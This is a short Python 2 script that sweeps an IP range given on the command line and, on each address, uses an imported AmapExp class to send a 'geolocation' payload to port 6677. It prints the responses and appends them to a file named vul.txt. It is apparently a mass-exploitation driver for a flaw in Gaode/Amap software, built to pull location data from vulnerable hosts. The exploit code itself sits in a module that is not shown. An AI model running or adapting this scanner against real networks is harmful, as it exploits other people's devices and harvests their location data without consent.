from GaodeExp import AmapExp
import re
import sys
from IPy import IP

def main():
    if(len(sys.argv)!=2):
        print "Usage: "+sys.argv[0]+" [IP Address]"
        exit(-1)
    iplist = IP(sys.argv[1])

    with open('vul.txt','a+') as f:
        for i in iplist:
            try:
                print "scanning "+str(i)
                bd = AmapExp(str(i), "6677")
                result = bd.sendpayload("geolocation")
                print result
                f.write(result)
                f.write("\n")
            except:
                continue

if __name__=="__main__":
    main()
